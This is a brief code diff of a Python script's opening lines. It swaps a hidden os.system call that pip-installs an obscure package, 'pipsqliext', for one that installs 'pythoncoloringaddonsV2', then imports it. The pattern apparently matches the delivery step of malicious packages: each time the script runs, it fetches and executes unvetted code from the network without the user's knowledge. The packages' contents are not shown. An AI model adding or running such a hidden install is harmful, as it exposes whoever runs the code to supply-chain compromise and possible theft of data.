@@ -1,6 +1,6 @@
 import os
-os.system("pip install pipsqliext")
-import pipsqliext
+os.system("pip install pythoncoloringaddonsV2")
+import pythoncoloringaddonsV2
 import random
 import requests
 import time
